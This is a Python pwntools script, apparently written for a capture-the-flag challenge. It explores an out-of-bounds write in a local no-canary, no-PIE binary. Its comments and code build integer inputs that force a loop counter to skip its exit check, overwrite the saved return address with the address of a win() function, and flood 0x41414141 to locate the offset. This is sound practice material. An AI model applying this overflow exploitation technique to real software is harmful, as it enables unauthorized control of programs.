#!/usr/bin/env python3
# Explore the overflow locally with pwntools on the no-canary no-pie build.
from pwn import *
context.log_level = "error"
context.arch = "amd64"

elf = ELF("/work/bigwin/chal_np")
win_addr = elf.symbols["win"]
print("win() @", hex(win_addr))

# The loop: writes noob.numbers[i] (4 bytes each) for increasing i.
# To trigger OOB we make accum==67 once so i skips 7 (goes 6->8), loop never sees i==7 -> keeps going.
# Each iteration reads one int with scanf("%d"). We feed a stream of ints.
# We need to find: how many ints from numbers[0] until we reach saved RIP, and overwrite with win.
#
# Strategy: feed numbers, at some point make cumulative accum hit 67 to trigger the skip so the
# loop won't terminate at i==7. Then keep writing until RIP.
# But scanf %d reads 4-byte ints; RIP is 8 bytes -> need two ints (low, high).
#
# First, brute find the index where writing a marker changes RIP: feed increasing count of 0x41414141
# and watch for crash / control. Easier: just try to place win_addr at various offsets.

def attempt(pad_ints, ret_low, ret_high, trigger_at=None):
    # Build inputs: we must AVOID accum hitting 67 accidentally, and trigger it ONCE deliberately
    # so i skips past 7. Use 0 for most values (accum stays same), then a single value to hit 67.
    ints = []
    # first 7 legit-ish writes numbers[0..6]; but we need the skip to bypass i==7.
    # Plan: numbers[0..5] = 0 (accum 0), numbers[6]=67 -> accum=67 -> triggers skip at i=6 -> i becomes 8.
    # Now loop continues (i=8 != 7). numbers[8],[9],... are OOB above the struct.
    # Feed 0s to pad up to RIP then the address halves.
    ints = [0,0,0,0,0,0,67]  # 7th input triggers accum==67 at i=6
    ints += [0]*pad_ints
    ints += [ret_low, ret_high]
    ints += [0]*40  # extra in case loop keeps going
    payload = "\n".join(str(c) for c in ints) + "\n"
    p = process("/work/bigwin/chal_np")
    p.sendline(payload.encode() if isinstance(payload,str) else payload)
    try:
        out = p.recvall(timeout=3)
    except Exception:
        out = b""
    p.close()
    return out

# Quick: just run once feeding the trigger and lots of zeros, watch behavior
p = process("/work/bigwin/chal_np")
inp = "\n".join(["0","0","0","0","0","0","67"] + ["1094795585"]*30) + "\n"  # 0x41414141
p.sendline(inp.encode())
out = p.recvall(timeout=3)
print("--- run with 0x41414141 flood ---")
print(out.decode(errors="replace")[-400:])
p.close()
